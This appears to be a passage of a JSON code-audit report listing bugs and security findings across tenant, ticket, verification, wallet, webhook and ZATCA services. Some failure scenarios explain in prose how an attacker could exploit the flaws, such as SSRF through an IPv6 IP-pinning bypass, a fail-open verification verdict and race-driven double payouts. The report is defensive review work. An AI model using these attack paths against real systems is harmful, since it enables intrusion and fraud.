+          "detail": "delete() (line 160-171), suspend() (126-143) and reactivate() (146-157) call auditor.record(...) BEFORE _load(), which is the call that 404s on a missing/unknown tenant_id. When the tenant does not exist, the audit sink has already persisted a 'tenant.deleted' / 'tenant.suspended' / 'tenant.reactivated' entry attributing a destructive action that never happened to the operator, and the request then returns 404. Because these actions are critical and fail-closed, this also lets an attacker with platform.tenants generate audit-log noise / false attribution for arbitrary tenant_ids without any state change. The write-ahead rationale (do not 503 a caller whose mutation already succeeded) does not require recording before confirming the target even exists.",
+          "failure_scenario": "Operator (or a compromised platform token) calls DELETE /api/v1/tenants/does-not-exist. Audit log gains a 'tenant.deleted resource=tenant:does-not-exist actor=<operator>' entry; the endpoint returns 404 and nothing was deleted. The audit trail now shows deletions that never occurred."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/core/tenant_service.py",
+          "line": 105,
+          "title": "Self config/branding updates have no tenant-status guard; a suspended tenant keeps mutating, and a tombstoned tenant is partially rewritten",
+          "detail": "update_config() and set_branding() unconditionally merge into tenant.config/branding and call repo.update(), with no check on tenant.status. The self routes (PUT /api/v1/tenant/config and /branding) reach these for any principal holding tenant.manage whose token is still valid. A SUSPENDED tenant (including one suspended by owner-close within the grace window) can therefore keep editing its own config/branding despite being off the platform. Worse, if the token outlives a tombstone, _own -> _load returns the tombstone Tenant (status=deleted, config stripped to keep-fields) and update_config re-populates and re-persists config onto the deleted marker via repo.update(), writing attacker-controlled data back onto a record whose whole purpose is to be a minimal erasure marker.",
+          "failure_scenario": "Owner self-closes tenant (status=suspended, grace pending). With the still-valid session token they PUT /api/v1/tenant/config; the change is accepted and persisted even though access was supposed to have stopped, and the config write is not gated by the suspended state."
+        },
+        {
+          "category": "security",
+          "severity": "low",
+          "file": "app/api/internal.py",
+          "line": 77,
+          "title": "Internal tenant view exposes the full config blob (including internal _close scheduling and closed_by actor) to any internal caller",
+          "detail": "_internal_view() returns fields listed in TENANT_INTERNAL_FIELDS, whose default (app/config.py:314) includes 'config'. tenant.config carries the service-internal '_close' object written by close() (app/core/tenant_service.py:168), which contains scheduled_at, grace_until and closed_by — the subject id of the operator/owner who closed the tenant. Any peer holding only the shared internal token (the default-open internal tier) reading GET /internal/tenants/{id} or /internal/tenants/resolve therefore receives internal lifecycle scheduling and an actor identifier that is not part of the tenant's public/business data. Least-privilege intent of the field allowlist is undercut because '_close' rides inside the broad 'config' field rather than being an explicitly chosen exposure.",
+          "failure_scenario": "A render/peer service calls GET /internal/tenants/{id} to fetch branding; the response also includes config._close.closed_by, leaking who closed the tenant and its erasure schedule to a service that had no need for it."
+        }
+      ]
+    },
+    {
+      "service": "ticket-service",
+      "issues": [
+        {
+          "category": "bug",
+          "severity": "high",
+          "file": "services/ticket-service/app/core/erasure.py",
+          "line": 44,
+          "title": "DSAR erasure leaves raw PII (sender phone number) in ticket.ref",
+          "detail": "TicketErasure.erase() redacts a ticket's `subject` and clears `meta`, but never touches `ref`. Inbound-channel tickets are opened with ref={'kind': channel, 'id': sender} where `sender` is the customer's raw phone number (see inbound_bridge.py:95). The erase loop (lines 41-45) only sets row['subject']=[erased] and row['meta']={}, so after a DSAR the raw phone number persists in ref.id in the datastore. The service's own model docstring claims a ticket 'carries raiser_ref, not a person' and that erasure removes the mutable PII, but this identifier is left behind, defeating the erasure guarantee compliance-service relies on.",
+          "failure_scenario": "A WhatsApp message opens ticket T with ref={'kind':'whatsapp','id':'+9665...'}. Compliance runs POST /internal/privacy/erase for that subject. erase() redacts subject/meta and reports success, but ticket row T still contains ref.id='+9665...' (the raw phone) forever."
+        },
+        {
+          "category": "security",
+          "severity": "medium",
+          "file": "services/ticket-service/app/core/inbound_bridge.py",
+          "line": 54,
+          "title": "Raw sender (phone number) persisted in plaintext as ticket ref and thread-index key",
+          "detail": "The module docstring states 'The sender (a phone number) is never stored raw', but _thread_key() (line 54) builds a persisted datastore key '{len}:{tenant}|{channel}|{sender}' embedding the raw sender, and ingest() writes ticket ref={'kind':channel,'id':sender} (line 95) with the raw sender. Both are written to the store in the clear (collections inbound_threads and tickets). Neither is pseudonymised, and neither is covered by TicketErasure (the thread index and ref are never redacted), so the raw phone number is stored at rest and is not erasable — contradicting the stated invariant and the pseudonymisation design used elsewhere.",
+          "failure_scenario": "Any inbound WhatsApp message causes '+96650...' to be stored verbatim as an inbound_threads row key and inside the ticket's ref.id, readable by anyone with datastore access and surviving a DSAR."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "services/ticket-service/app/core/ticket_service.py",
+          "line": 88,
+          "title": "Per-type reply_capability is parsed but never enforced",
+          "detail": "TicketType carries reply_capability (workflow.py:37, populated at workflow.py:152 from config, e.g. config.py:264/286), advertised as 'who may add a reply'. But TicketService.reply() (line 88) never checks it, and the route POST /tickets/{id}/replies (tickets.py:178) only requires _SELF (tickets.self OR tickets.manage OR platform.tickets) plus ownership. A ticket type that sets reply_capability to a stricter cap (e.g. 'tickets.manage', to make a type operator-reply-only) is silently ignored — any owning tickets.self holder can still reply. This is an advertised-but-unread authorization knob: the config accepts and stores it, but behaviour does not change, so an operator believes a restriction is in force that is not.",
+          "failure_scenario": "Admin configures a ticket type with reply_capability='tickets.manage' intending only staff may reply. A customer (tickets.self) who raised such a ticket POSTs a reply and it is accepted, because reply_capability is never consulted."
+        },
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "services/ticket-service/app/api/internal.py",
+          "line": 316,
+          "title": "Grantee scoped ticket list filters by scope AFTER a capped fetch, silently omitting covered tickets",
+          "detail": "list_shared_tickets() calls tickets.find(tenant=tenant, limit=cap+1) with NO scope filters pushed into the query, then filters in Python with grant.covers(r) (lines 316-320). find() returns only the newest cap+1 tickets by created-desc. If the tenant has more than cap+1 tickets and the grant is scoped (e.g. scope type=['billing']), covered tickets that are not among the newest cap+1 rows are never returned, and 'truncated' (len(covered) > cap) is computed from the pre-filter fetch so it under-reports. The grant's type/status scope is known and could be passed to TicketStore.find filters, but is not. There is also no cursor exposed, so a grantee cannot page to the omitted rows.",
+          "failure_scenario": "A tenant has 5000 tickets; the newest 51 are all type='support'. A grantee with scope type=['billing'] calls GET /internal/tickets — covered=[] and truncated=false, so the grantee sees zero of the tenant's many billing tickets and is told nothing was hidden."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "services/ticket-service/app/core/inbound_bridge.py",
+          "line": 78,
+          "title": "Inbound idempotency claim is get-then-put (TOCTOU), not atomic compare-and-set",
+          "detail": "ingest() checks store.get(_INGESTED, ikey) is None (line 78) and then store.put()s the claim (line 82) as two separate operations with no atomic CAS. Two concurrent deliveries/re-polls of the same external_id can both observe None and both proceed to open/append a ticket, producing a duplicate. The docstring acknowledges the claim is 'BEFORE the ticket write' but the check-then-set is not atomic, so the dedupe guarantee only holds under the assumption of a single serial scheduler; any concurrency (two scheduler ticks, two pods) breaks it.",
+          "failure_scenario": "The drain/ingest endpoint is invoked twice concurrently (retry or overlapping schedule) with the same message batch; both calls see _INGESTED miss for wamid X and each open a ticket, so the customer's one message yields two tickets/replies."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "services/ticket-service/app/core/ticket_service.py",
+          "line": 118,
+          "title": "State transitions have no optimistic concurrency; concurrent moves last-write-wins",
+          "detail": "transition() fetches the ticket, checks can_transition on the current status, then sets t.status and save()s (lines 107-120) with a plain put (TicketStore.save -> datastore.put, no version/CAS). Two concurrent transitions from the same source status (e.g. new->resolved and new->rejected) can both pass the guard and both append status_changed events, leaving the projection with whichever wrote last while the event log records two contradictory terminal moves from the same state. assign()/tag() have the same last-write-wins behaviour on the projection.",
+          "failure_scenario": "Two operators simultaneously move ticket T from 'new'; both reads see status='new', both validate, both save. The log shows new->resolved AND new->rejected, and t.status is whichever put landed last — an inconsistent, unreproducible outcome."
+        }
+      ]
+    },
+    {
+      "service": "verification-service",
+      "issues": [
+        {
+          "category": "security",
+          "severity": "high",
+          "file": "app/adapters/verifier/http.py",
+          "line": 142,
+          "title": "Empty/unconfigured verdict_ok makes an empty provider response read as VERIFIED (fail-open)",
+          "detail": "_read_verdict compares `value == self._p.get(\"verdict_ok\", \"\").strip()`. When a provider profile has a verdict_path but no verdict_ok (default \"\"), and the provider's response contains an empty string at verdict_path, then value==\"\" and verdict_ok==\"\" match, returning Outcome(VERIFIED). This directly violates the file's own stated invariant ('Unrecognised never falls through to yes'). The production boot guard (config.py assert_verify_config_ok, line 435) requires verdict_path but never requires verdict_ok, so a service boots in production with this hole. Only a missing field (raw is None -> ERROR) is guarded; an empty-string field is not.",
+          "failure_scenario": "Operator configures VERIFY_PROFILES with provider.verdict_path=data.status but omits provider.verdict_ok. Provider returns HTTP 200 {\"data\":{\"status\":\"\"}} (or any path resolving to \"\") for an unverified/failed claim -> service records verdict=verified and grants trust to an unverified identity."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/verification_service.py",
+          "line": 119,
+          "title": "Async provider callback (resolve) is never wired to any route; PENDING verdicts can only expire, never succeed",
+          "detail": "VerificationService.resolve() is the documented idempotent callback that moves a PENDING async verification to VERIFIED/REFUSED. A repo-wide grep shows resolve() has no caller and no HTTP route in api/internal.py or api/v1/*. Providers configured with verdict_pending (the file's headline feature: 'Async is a real state', Nafath-style push) therefore produce PENDING records that only ever lapse to EXPIRED via sweep_pending. No async verification can ever succeed.",
+          "failure_scenario": "A tenant configures a Nafath-style provider that returns AWAITING_USER (mapped to verdict_pending). The user approves on their phone, but there is no endpoint for the provider's callback to reach resolve(); the record sits PENDING until pending_until, then sweep_pending marks it EXPIRED. A legitimately verified user is never verified."
+        },
+        {
+          "category": "perf",
+          "severity": "medium",
+          "file": "app/adapters/datastore/postgres.py",
+          "line": 33,
+          "title": "ORDER BY index does not match the sort key used by every verification query",
+          "detail": "The shipped btree index kv_created_desc is on `(collection, COALESCE(value->>'created',''), key)`, but every VerificationStore query (stores.py latest/for_subject/pending_before/pending_reviews, lines 47,52,59,67) sorts by created_at, producing ORDER BY COALESCE(value->>'created_at','') in find(). The index field ('created') never matches the ORDER BY field ('created_at'), so Postgres cannot use it to order — exactly the mismatched-index bitmap-scan + top-N sort the adapter's own comment (lines 24-30) warns against. pending_reviews and pending_before scan and sort all matching rows on every request/sweep.",
+          "failure_scenario": "A tenant with a large verification history calls GET /verification/claims or the review queue: Postgres GIN-filters then sorts all of the tenant's (or all PENDING) rows in memory O(rows) instead of an O(page) index scan, degrading under load."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/stores.py",
+          "line": 86,
+          "title": "IdentityRegistry.remember is a non-atomic get-then-put, weakening once-per-identity anti-abuse",
+          "detail": "remember() does `existing = await store.get(_SEEN, claim_ref)` then branches to put a new row (first_seen=True) or increment. There is no CAS/atomic upsert on the count, so two concurrent verifications of the same identity both read existing=None, both write a fresh row with first_seen=True/times=1, and one clobbers the other. This is the exact anti-abuse invariant the collection exists to protect (per the module docstring: stop a repeat welcome-gift by recognising the same registration).",
+          "failure_scenario": "Attacker fires two verify() requests for the same commercial registration simultaneously (different tenants). Both remember() calls observe no prior row and record first_seen; the 'seen before' count is 1 not 2, and downstream once-per-identity grant logic reading this signal can be induced to treat a repeat identity as first-seen."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/core/review.py",
+          "line": 82,
+          "title": "decide() has no optimistic concurrency; concurrent reviews can lose updates / double-settle",
+          "detail": "decide() reads the record, checks verdict not in (VERIFIED,REFUSED), then mutates and put()s with no version/CAS check. Two concurrent decisions on the same PENDING record both pass the settled-check and both write; under two-eyes, two concurrent first-approvals each read reviewers=[] and each write their own single-element reviewers list, overwriting the other, so the two-eyes accumulation is lost.",
+          "failure_scenario": "Two reviewers approve the same claim at the same time under VERIFY_TWO_EYES: each reads provider_state.reviewers=[], each writes reviewers=[self]; the last write wins with one reviewer recorded, neither the completion nor a correct two-eyes tally results."
+        }
+      ]
+    },
+    {
+      "service": "wallet-service",
+      "issues": [
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "app/core/wallet_service.py",
+          "line": 266,
+          "title": "Idempotency row loses its version on finalize; Postgres re-claim after TTL is permanently stuck at 409",
+          "detail": "_claim() atomically claims a slot with store.cas(..., expected_version=0/N, ...) which stamps a version. But _finalize() (line 266) writes the finished result with a plain store.put({'result':..., 'expires_at':...}) that carries NO version field. On the Postgres datastore, put() upserts the value verbatim, so the finished idempotency row ends up with no 'version' key. When the result TTL later expires and the SAME source is presented again, _claim() falls through to the re-claim branch: expected = int(row.get('version',0)) = 0, then store.cas(key, 0, ...). PostgresDataStore.cas() treats expected==0 as INSERT ... ON CONFLICT DO NOTHING (postgres.py:248-254), which returns 0 rows because the key already exists -> won=False -> (False, None) -> caller raises Conflict('WALLET_OP_IN_PROGRESS'). The slot can never be re-claimed and never replays. On the in-memory store the same path works (cas with expected 0 matches a versionless row), so this is also a silent memory-vs-postgres behavioural divergence that tests on memory will not catch.",
+          "failure_scenario": "credit(source='psp_settlement_123') runs and finalizes on Postgres. >24h later (WALLET_IDEMPOTENCY_TTL_SECONDS elapsed) the PSP redelivers settlement 'psp_settlement_123'. Instead of a clean replay or re-execution, credit() returns HTTP 409 forever and never resolves."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/core/wallet_service.py",
+          "line": 719,
+          "title": "sweep_grants claws back money attributed to a different grant on the same fund (mixed policies)",
+          "detail": "sweep_grants computes spare = int(w.funds.get(grant.fund,0)) - int(w.held.get(grant.fund,0)) (line 719) and claws remaining = max(0, min(spare, grant.amount)). This is a FUND-GLOBAL figure; the service never tracks per-grant consumption. When two grants share one fund but carry DIFFERENT frozen policies and the customer has spent part of the pool, an expiring 'forfeit' grant will forfeit balance that logically belongs to a still-active 'extend'/'dormant' grant, because it assumes its own remainder is still whole. Money the platform intended to preserve (dormant/extend) is irreversibly clawed back (clawback). With a single policy per fund the accounting is fungible and harmless; the defect appears only with mixed policies on one fund.",
+          "failure_scenario": "Fund 'promo' has grant A (100, forfeit, expires today) and grant B (100, extend, expires next month); customer spent 100 from the fungible 200. Balance=100, held=0. sweep_grants on A: spare=100, remaining=min(100,100)=100 -> clawback 100, leaving 0. B's 100 that should have been auto-extended is gone."
+        },
+        {
+          "category": "perf",
+          "severity": "medium",
+          "file": "app/core/wallet_service.py",
+          "line": 216,
+          "title": "reconcile() is an unbounded O(seq) sequential read on request-exposed endpoints",
+          "detail": "reconcile() loops `for seq in range(1, w.seq + 1)` issuing one store.get(_LEDGER, key) per ledger entry (line 216-217). It is exposed at GET /internal/wallet/{tenant}/reconcile (internal.py:148) and GET /api/v1/wallet/admin/reconcile (wallet.py:110). Unlike ledger() (clamped to LEDGER_LIST_LIMIT) and the sweepers (paged), reconcile has no bound: a tenant with a large ledger forces millions of sequential round-trips inside a single HTTP request. On Postgres each get() is a separate pool acquire + query, so this both starves the connection pool and can run for minutes, a denial-of-service vector reachable by any platform operator or internal caller.",
+          "failure_scenario": "A high-volume tenant accumulates ~2M ledger entries. A single call to /api/v1/wallet/admin/reconcile?tenant=X issues ~2M sequential SELECTs, holding a pool slot and blocking for minutes; a few concurrent calls exhaust DATASTORE_POOL_MAX and stall the service."
+        },
+        {
+          "category": "bug",
+          "severity": "medium",
+          "file": "app/core/wallet_service.py",
+          "line": 398,
+          "title": "withdraw() double-pays on retry when source is empty despite documented idempotency",
+          "detail": "withdraw()'s docstring states 'Idempotent by source, so a retried request never pays out twice', but _claim() returns (True, None) immediately when source is falsy (line 240-241 opt-out). The internal route defines source with default '' (internal.py:88), so a caller (or a network-level retry) that omits source gets NO idempotency: each call writes a new PENDING Withdrawal and debits withdrawable funds again. Because this is money LEAVING the platform, a silent idempotency opt-out on empty source is a double-payout footgun that contradicts the stated guarantee (refund() deliberately avoids this by keying on the spend seq instead of the caller source).",
+          "failure_scenario": "A payout orchestrator POSTs /internal/wallet/withdraw {tenant, amount:50000} with no source, the response is lost to a timeout, and it retries. Two PENDING withdrawals are created and the balance is debited 100000; two external transfers execute."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/api/internal.py",
+          "line": 250,
+          "title": "confirm/release audit rows record an empty tenant",
+          "detail": "The confirm and release routes record audit with tenant=str(result.get('tenant','')) (internal.py:250 and 264), but WalletService.confirm()/release() results never include a 'tenant' key (confirm returns {'hold_id','state','released', **out} where out is {'funds','held','balance','entry'}). So every wallet.confirmed / wallet.released audit row is written with tenant='' , weakening cross-tenant attribution of money-consuming actions in the audit trail (the hold_id resource is still present, but the tenant dimension a review filters on is blank).",
+          "failure_scenario": "During an incident review, filtering audit records by tenant misses all confirm/release events for the affected tenant because they were all recorded with an empty tenant field."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "app/api/internal.py",
+          "line": 160,
+          "title": "Critical wallet.credited audit written before input validation, logging credits that never happened",
+          "detail": "The credit route records the critical wallet.credited audit row (write-ahead) at internal.py:160 BEFORE calling WalletService.credit(), which then validates the fund and raises WalletError('UNKNOWN_FUND:...') at wallet_service.py:276-277 (and require_non_negative before that). A request naming a non-existent fund (or otherwise rejected before any mutation) still emits a critical money-creation audit event, producing a false 'credit' record for an action that moved no money. This pollutes exactly the insider-fraud trail that marking wallet.credited critical is meant to keep trustworthy.",
+          "failure_scenario": "POST /internal/wallet/credit {tenant, fund:'nonexistent', amount:1000} is rejected with 400 UNKNOWN_FUND, yet a wallet.credited audit row for tenant/1000 is already in the tamper-evident chain, implying a credit that never occurred."
+        }
+      ]
+    },
+    {
+      "service": "webhook-service",
+      "issues": [
+        {
+          "category": "correctness",
+          "severity": "high",
+          "file": "services/webhook-service/app/core/webhook_service.py",
+          "line": 162,
+          "title": "Circuit-open / disabled deliveries are never re-scheduled, so they permanently occupy the sweep budget (head-of-line starvation)",
+          "detail": "On the early-return paths in deliver() — circuit_open (lines 162-163) and endpoint_disabled (lines 156-157) — the delivery's status stays QUEUED/FAILED and next_retry_at is left unchanged (still <= now). DeliveryStore.due() (stores.py:170-187) selects exactly the rows with status in {queued,failed} and next_retry_at <= now, sorted by created ASC, up to list_limit (default 100). So these deliveries remain 'due' on every single sweep tick forever. deliver() re-processes them and returns immediately without progress, and because they are the oldest they crowd out deliverable rows for healthy endpoints.",
+          "failure_scenario": "One customer disables an endpoint (or an endpoint's circuit opens) that has >100 QUEUED deliveries. Every /internal/webhooks/sweep tick, due() fills its entire 100-row budget with those perpetually-due, oldest-first rows; deliver() returns 'endpoint_disabled'/'circuit_open' for each and advances nothing. Deliverable webhooks for every other tenant behind them never get sent — a single dead endpoint stalls fleet-wide delivery (availability DoS) and the sweeper busy-loops on the same rows."
+        },
+        {
+          "category": "vuln",
+          "severity": "high",
+          "file": "services/webhook-service/app/adapters/transport/httpx_transport.py",
+          "line": 24,
+          "title": "httpx transport IP-pinning is defeated for IPv6-resolved hosts, reopening the SSRF/DNS-rebinding window (and breaking IPv6 delivery)",
+          "detail": "The pin is applied by string surgery: pinned = url.replace(f'//{host}', f'//{pinned_ip}', 1). host comes from urlsplit(url).hostname, which returns IPv6 addresses UNBRACKETED, whereas the URL authority contains them BRACKETED ('//[2001:db8::1]'). The replace therefore never matches, so pinned == the original URL and httpx connects by RE-RESOLVING the hostname itself — exactly the TOCTOU/rebinding window core.ssrf.validate() pinned an IP to close. Even for an ordinary hostname whose validated address is IPv6, the substituted authority '//2001:db8::1/...' is malformed, so the connection either misparses or fails. Contrast StdlibTransport (the default), which connects to the pinned_ip directly with correct AF_INET6 handling.",
+          "failure_scenario": "With WEBHOOK_TRANSPORT_DRIVER=httpx, an attacker registers an endpoint on a hostname that resolves to a public IPv6 at validation time, then flips DNS to an internal IPv6 (or link-local) before the delivery attempt. Because the pin is silently not applied, httpx re-resolves and connects to the attacker-controlled internal target — SSRF against internal services. Separately, legitimate IPv6-only endpoints can never receive deliveries."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "services/webhook-service/app/core/webhook_service.py",
+          "line": 171,
+          "title": "deliver() has no compare-and-set on the DELIVERING transition, allowing concurrent double-send of the same delivery",
+          "detail": "deliver() guards only against DELIVERED/DEAD (line 149), then sets d.status=DELIVERING and saves (lines 171-173) with no atomic CAS from the prior status. Two concurrent invocations — e.g. the sweep loop and a manual POST /internal/webhooks/deliver/{id}, or two overlapping sweeps — both read the same QUEUED/FAILED row, both pass the guard, and both perform the outbound HTTP send.",
+          "failure_scenario": "A sweep tick picks delivery dlv_X (QUEUED) at the same moment an operator calls the internal deliver route for dlv_X. Both send the webhook to the customer endpoint, producing a duplicate delivery. Only the consumer's Idempotency-Key dedupe prevents a duplicate downstream side effect; the service itself provides no once-only guarantee at the transition."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "services/webhook-service/app/core/inbound_service.py",
+          "line": 54,
+          "title": "Inbound dedupe (seen -> record) is not atomic, so concurrent duplicate events are published twice",
+          "detail": "ingest() checks store.seen() (line 54) and only later calls store.record() (line 59) and _publish() (line 60). There is no atomic reserve/insert-if-absent. Two concurrent requests carrying the same (source, provider_event_id) both observe seen()==False, both record (second overwrites the first by key) and both publish to the event bus.",
+          "failure_scenario": "A provider (or an attacker replaying within the signature tolerance window) sends the same signed event twice near-simultaneously. Both pass the dedupe check and both fire inbound.<source> onto the EventBus, so downstream subscribers process the same third-party event twice despite the documented once-only intent."
+        },
+        {
+          "category": "correctness",
+          "severity": "low",
+          "file": "services/webhook-service/app/core/webhook_service.py",
+          "line": 41,
+          "title": "3xx responses are classified as retryable and retried to exhaustion instead of treated as terminal",
+          "detail": "classify() (lines 31-41) returns 'delivered' only for 2xx, 'terminal' for 4xx (except 408/429), and falls through to 'retryable' for everything else — which includes 3xx. The transports do not follow redirects (httpx Client defaults follow_redirects=False; the stdlib transport issues a single request). So a customer endpoint answering 301/302/307 is retried up to RETRY_MAX_ATTEMPTS (8) with backoff and then dead-lettered, though it will never succeed.",
+          "failure_scenario": "A customer moves their endpoint and returns 301 to the new URL. Every delivery to that endpoint burns all 8 retries over the full backoff window and lands in the DLQ, wasting worker capacity and delaying the dead-letter signal, when the response is deterministically non-retryable."
+        }
+      ]
+    },
+    {
+      "service": "zatca-service",
+      "issues": [
+        {
+          "category": "correctness",
+          "severity": "high",
+          "file": "app/core/stores.py",
+          "line": 144,
+          "title": "PIH captured at slot-allocation time forks the ICV/PIH chain under deferred or out-of-order signing",
+          "detail": "allocate_slot() freezes an invoice's PIH from head.last_hash (the last SIGNED invoice's hash) at the moment the slot is reserved, and build_ubl() then bakes that PIH into the unsigned draft XML (zatca_service.finalize lines 51-60, ubl.py line 113). But signing is explicitly deferred/retryable on a signer outage or not-onboarded tenant (zatca_service._defer, _sign), and finalize has no per-tenant ordering lock, so invoice N can be allocated before invoice N-1 is signed. record_hash only advances head.last_hash for the highest-ICV signed invoice, so N's PIH ends up pointing at an older invoice's hash, not N-1's actual hash. chain.verify_chain() enforces pih == prev.hash (line 28) and ZATCA reporting/clearance enforces the same, so the invoice is rejected and the taxpayer's chain is permanently broken from that ICV onward.",
+          "failure_scenario": "Signer is briefly unavailable. finalize(number=5) allocates ICV 5 with PIH=hash(4) but sign fails -> stays pending. finalize(number=6) allocates ICV 6, head.last_hash is still hash(4) (5 never signed), so PIH(6)=hash(4). Signer recovers; 5 and 6 both sign. Invoice 6's PIH is hash(4), not hash(5). verify_chain returns pih_mismatch at ICV 6 and ZATCA rejects invoice 6 and every later invoice."
+        },
+        {
+          "category": "correctness",
+          "severity": "medium",
+          "file": "app/api/v1/zatca.py",
+          "line": 27,
+          "title": "build_zatca() never receives the invoice's tenant, so per-tenant signer credentials are silently ignored",
+          "detail": "build_zatca(request, tenant=\"\") resolves the signer credential via `await creds.token(tenant)` (lines 37-40), but every caller invokes build_zatca(request) with no tenant: the internal finalize (internal.py line 76), internal/admin sweep, onboard_compliance/onboard_production, and all admin invoice routes. SignerCredentials.token(\"\") (operator_credentials.py line 34) therefore only ever reads the platform-wide (tenant \"\") stored/config token. The entire per-tenant operator-credential feature (set_secret with a tenant, _invalidate(tenant)) is dead for signing and onboarding: a per-tenant ZATCA_SIGNER_TOKEN set through the operator panel is written and cached under tenant X but never consulted when finalizing or onboarding tenant X.",
+          "failure_scenario": "Operator sets a tenant-specific signer token for tenant X via PUT /operator/secrets {tenant: X}. finalize for an invoice of tenant X calls build_zatca(request) (tenant \"\"), which resolves token(\"\") = the platform token, signing tenant X's invoices with the wrong sidecar credential (or failing) while the panel reports the tenant credential as set."
+        },
+        {
+          "category": "perf",
+          "severity": "medium",
+          "file": "app/core/stores.py",
+          "line": 105,
+          "title": "Retry sweep reads the entire pending backlog every run when few invoices are due",
+          "detail": "due_for_retry() pushes the three unfinished statuses into the datastore but filters next_retry_at in Python (lines 111-114), looping `while len(out) < limit` and paging _PAGE=500 rows at a time until the cursor is exhausted. When only a handful of invoices are actually due, `out` never reaches `limit`, so the loop reads EVERY pending/signed/submitted invoice across all tenants on every sweep. sweep() runs on a schedule (POST /sweep and /internal/zatca/sweep), so with a large steady-state backlog of not-yet-due invoices each sweep is O(total unfinished invoices) instead of O(due).",
+          "failure_scenario": "100,000 invoices sit in 'pending' with next_retry_at in the future (e.g. capped or long-backoff). A sweep needing to process 3 due invoices still fetches all 100,000 rows in 200 datastore pages before returning, on every scheduled sweep tick."
+        },
+        {
+          "category": "bug",
+          "severity": "low",
+          "file": "app/api/internal.py",
+          "line": 71,
+          "title": "Internal finalize promises 'never fails the caller' but raises 500 on a malformed line or currency",
+          "detail": "The finalize route validates only that invoice.number is present (line 74); build_ubl() then does `int(ln[\"amount_minor\"])` for each line (ubl.py line 55) and raises ValueError on a non-3-letter currency (line 48). finalize() (zatca_service.py) does not wrap build_ubl in try/except, so a line missing amount_minor (KeyError), a non-integer amount, or a bad currency propagates out as an unhandled 500 — contradicting the documented guarantee that finalize never fails the caller and leaves nothing retryable.",
+          "failure_scenario": "A caller posts /internal/zatca/finalize with invoice.lines=[{\"description\":\"x\"}] (no amount_minor). build_ubl raises KeyError('amount_minor'), which is not caught, returning HTTP 500 instead of a 422 or a retryable pending invoice."
+        }
+      ]
+    }
+  ]
+}
